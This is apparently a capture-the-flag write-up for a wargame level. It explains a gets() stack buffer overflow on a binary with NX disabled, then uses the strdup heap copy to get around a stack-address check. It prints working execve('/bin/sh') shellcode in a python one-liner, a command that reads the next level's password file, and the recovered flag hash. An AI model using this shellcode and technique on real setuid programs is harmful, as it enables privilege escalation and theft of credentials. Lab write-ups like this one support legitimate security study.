Once again we have a binary that uses gets and is susceptible to buffer overflow exploits
After running it we can see that it takes an input from STDIN and can overflow. Time to dissassemble
main calls function p where we find the gets (buffer overflow vunlerable). But there is no function in the program that we can jump to that opens a shell prompt
We must find a way to induce our own using a shellcode injection
Injecting an address right after the gets buffer replaces the functions return address
By putting shell spawning code in the buffer, and replacing the return address of the function with the address for the buffer, thus running the shellcode we can abuse the binary elevated permissions
However the program checks for the injection of a stack addres 0xb. Fortunately, the strdup function makes a copy of the buffer on the heap so we must find that address using gdb and use it 
This exploit is possible because the NX protection (which makes codes in most memory regions Non eXecutable) is disabled
python -c "print '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80' + 55 * 'a' + '\x08\x04\xa0\x08'[::-1]" > /tmp/inj2
cat /tmp/inj2 - | ./level2
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
